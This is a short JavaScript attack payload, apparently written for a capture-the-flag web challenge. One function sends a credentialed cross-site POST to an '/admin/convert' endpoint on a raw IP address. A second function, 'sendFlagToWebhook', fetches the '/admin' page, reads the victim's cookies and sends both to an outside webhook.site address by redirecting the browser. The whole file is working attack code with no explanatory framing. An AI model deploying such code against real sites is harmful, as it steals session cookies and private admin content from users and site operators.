function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/54.180.108.161\/admin\/convert", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application\/json");
        xhr.withCredentials = true;
        var body = "{\"htmlCode\":\"\x3ch1\x3etesting\x3c/h1\x3e\"}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
submitRequest();


async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('/admin');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const cookie = document.cookie;
    const encodedcookie = encodeURIComponent(cookie);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}&cookies=${cookie}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39');
